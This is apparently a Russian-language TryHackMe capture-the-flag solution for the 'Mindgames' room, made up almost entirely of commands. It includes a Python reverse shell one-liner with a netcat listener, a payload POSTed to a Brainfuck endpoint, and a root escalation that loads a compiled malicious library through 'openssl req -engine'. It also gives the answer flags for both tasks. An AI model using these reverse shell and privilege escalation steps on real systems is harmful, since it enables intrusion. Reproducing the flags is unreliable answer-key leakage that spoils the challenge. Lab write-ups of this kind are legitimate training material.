[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Mindgames](https://tryhackme.com/r/room/mindgames) 

Всего 1 заданиe:
## Задание 1
Никаких подсказок. Взломайте. Не сдавайтесь, если застрянете, перечислите сложнее

### Ответьте на вопросы ниже
Пользовательский флаг.
```commandline
nmap -sSCV <IP>
curl -s http://<IP>
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("my_own_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
nc -nlvp 4444
curl -d "+++++ +++++ [REDACTED] ++ ++<]> ++.<" -X POST http://<IP>/api/bf
cat /home/user.txt
```
```commandline
thm{411f7d38247ff441ce4e134b459b6268}
```
+ 50
Корневой флаг.
+ 
```commandline
cat server.service 
gcc -fPIC -o rootshell.o -c rootshell.c
gcc -shared -o rootshell.so -lcrypto rootshell.o
chmod +x rootshell.so
openssl req -engine ./rootshell.so
cat /root/root.txt 
```
```commandline
thm{1974a617cc84c5b51411c283544ee254}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)